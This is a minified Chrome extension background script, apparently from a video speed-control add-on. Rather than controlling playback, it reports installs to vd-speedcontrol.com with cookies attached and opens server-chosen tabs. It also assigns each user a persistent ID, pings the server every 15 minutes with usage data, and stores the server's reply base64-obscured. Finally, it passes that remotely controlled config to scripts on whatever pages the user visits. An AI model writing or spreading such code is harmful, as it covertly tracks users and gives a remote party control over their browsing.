!function(){const e="https://vd-speedcontrol.com";chrome.runtime.onInstalled.addListener((a=>{"install"===a.reason&&fetch(e+"/trck/install.php?id="+chrome.runtime.id+"&v="+chrome.runtime.version,{credentials:"include"}).then((e=>e.text())).then((e=>{"string"==typeof(e=JSON.parse(e)).url&&e.url.startsWith("http")&&chrome.tabs.create({url:e.url})}))})),chrome.runtime.setUninstallURL(e+"/uninstall/index.html"),rulesManager={lsState:{},UPDATE_PERIOD:9e5,async start(){await rulesManager.lsDataRead(),await rulesManager.checkForUpdate()},generateUUID:()=>"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){var a=16*Math.random()|0;return("x"==e?a:3&a|8).toString(16)})),readLocalStorage:async e=>new Promise((a=>{e?chrome.storage.local.get(e,a):chrome.storage.local.get(a)})),async checkForUpdate(){try{rulesManager.lsState.uid||(rulesManager.lsState.uid=rulesManager.generateUUID(),await rulesManager.saveState()),navigator.locks.request("be_request",(async e=>{await rulesManager.updateConfig()}))}catch(e){}},async lsDataRead(){const e=await rulesManager.readLocalStorage({cache:null}),a=e.cache?JSON.parse(atob(e.cache)):{};Object.assign(rulesManager.lsState,a)},base64:e=>btoa(e.replace(/[\u00A0-\u2666]/g,(function(e){return"&#"+e.charCodeAt(0)+";"}))),saveState(){return new Promise((e=>{const a=this.base64(JSON.stringify(rulesManager.lsState));chrome.storage.local.set({cache:a},e)}))},async updateConfig(){rulesManager.lsState.uid||await rulesManager.lsDataRead();const a=chrome.runtime.getManifest().version;let t=(new Date).getTime(),r=t-rulesManager.lsState.mTime;rulesManager.lsState.mTime=t,r<2*rulesManager.UPDATE_PERIOD&&(rulesManager.lsState.lTime+=r);if(t-(rulesManager.lsState.laTime>0?rulesManager.lsState.laTime:0)>=.9*rulesManager.UPDATE_PERIOD){var s="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:a,uid:rulesManager.lsState.uid,lt:rulesManager.lsState.lTime,mt:rulesManager.lsState.mTime,e3tag:rulesManager.lsState.e3tag,src:rulesManager.lsState.src}))),n=e+"/ping/?"+s;rulesManager.lsState.laTime=t;const r=await fetch(n),l=await r.json();Object.assign(rulesManager.lsState,l),await rulesManager.saveState()}},async getCfg(e,a){var t=rulesManager.lsState;if(t.uid||await rulesManager.lsDataRead(),rulesManager.checkForUpdate(),t.extStat){if(t.rAllow)if(!new RegExp(t.rAllow[0],t.rAllow[1]).test(e))return void a({});if(t.rDeny)if(new RegExp(t.rDeny[0],t.rDeny[1]).test(e))return void a({});a(t)}else a({uid:t.uid,log:[],msg:"extStat is not enabled"})}},rulesManager.start(),chrome.runtime.onMessage.addListener(((e,a,t)=>{if("getConfig"===e.action)return rulesManager.getCfg(a.url,t),!0}))}();